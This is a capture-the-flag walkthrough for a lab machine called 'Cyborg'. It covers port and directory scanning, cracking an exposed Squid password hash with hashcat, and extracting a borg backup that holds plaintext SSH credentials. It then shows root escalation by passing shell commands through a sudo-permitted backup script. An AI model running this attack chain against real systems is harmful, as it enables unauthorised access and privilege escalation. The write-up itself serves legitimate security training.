# Cyborg

Notes from CTF

## Recon

### nmap

`└─# nmap -A 10.10.129.63`

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 21:53 UTC
Nmap scan report for ip-10-10-129-63.eu-west-1.compute.internal (10.10.129.63)
Host is up (0.00055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbb270f307ac32003f81b8d03a89f365 (RSA)
|   256 68e6852f69655be7c6312c8e4167d7ba (ECDSA)
|_  256 562c7992ca23c3914935fadd697ccaab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 02:69:DD:9E:A6:F5 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/20%OT=22%CT=1%CU=43203%PV=Y%DS=1%DC=D%G=Y%M=0269DD%T
OS:M=64B9ACD2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms ip-10-10-129-63.eu-west-1.compute.internal (10.10.129.63)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.77 seconds
```

### gobuster

`└─# gobuster dir -u 10.10.129.63 -w /usr/share/wordlists/dirb/big.txt `

```
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.129.63/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.129.63/etc/]
/server-status        (Status: 403) [Size: 277]
Progress: 16676 / 20470 (81.47%)===============================================================
2023/07/20 21:57:44 Finished
===============================================================

```

### website

http://10.10.129.63/admin/ is a music portfolio it looks like.

http://10.10.129.63/admin/admin.html
```
[Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
```
We can download `archive.tar`


http://10.10.129.63/etc/squid/passwd

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

http://10.10.129.63/etc/squid/passwd

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

`└─# hashid hash.txt`

```
--File 'hash.txt'--
Analyzing '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.'
[+] MD5(APR) 
[+] Apache MD5 
--End of file 'hash.txt'--      
```

### hashcat
https://hashcat.net/wiki/doku.php?id=example_hashes

`└─# hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt`

```
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward           
```

### archive.tar

`└─# tar -xvf archive.tar `

```
total 76
drwxrwxr-x 3 kali lxd   4096 Dec 29  2020 .
drwxr-xr-x 3 root root  4096 Jul 20 22:15 ..
-rw------- 1 kali lxd     73 Dec 29  2020 README
-rw------- 1 kali lxd    964 Dec 29  2020 config
drwx------ 3 kali lxd   4096 Dec 29  2020 data
-rw------- 1 root root    54 Dec 29  2020 hints.5
-rw------- 1 root root 41258 Dec 29  2020 index.5
-rw------- 1 root root   190 Dec 29  2020 integrity.5
-rw------- 1 root root    16 Dec 29  2020 nonce
```

README mentions
https://borgbackup.readthedocs.io/

`└─# apt install borgbackup -y` didn't work at first, so I ran 

`└─# apt-get update` first. This fixed the issue.

`└─# borg list final_archive`

```
Enter passphrase for key /root/Downloads/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```
use password squidward

`└─# borg extract --list final_archive/::music_archive`

use password squidward

Inside extracted files:

`─# cat Documents/note.txt `

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

`─# cat Desktop/secret.txt`

``` 
shoutout to all the people who have gotten to this stage whoop whoop!" 
```

## Gaining access

### ssh 

`└─# ssh alex@10.10.129.63` using `S3cretP@s3`

**flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}**


## Escalation

`alex@ubuntu:~$ sudo -l`

```
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

### exploiting backup.sh

`alex@ubuntu:~$ cat /etc/mp3backups/backup.sh `

```
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

`alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c "echo AAAAAAAAAAAAAAAAAAAAAAAA"`

```
Backup finished
AAAAAAAAAAAAAAAAAAAAAAAA
```

`alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c "/bin/sh"` opens a root shell, but there is no output until we exit...

`alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c "cat /root/root.txt"`


**flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}**

### root shell

We have the flag, but how would we get an actual root shell where we can see the output?

`alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh -c "/bin/bash"`

`root@ubuntu:/etc/mp3backups# exec 1> $(tty)` which redirects standard output into the terminal.
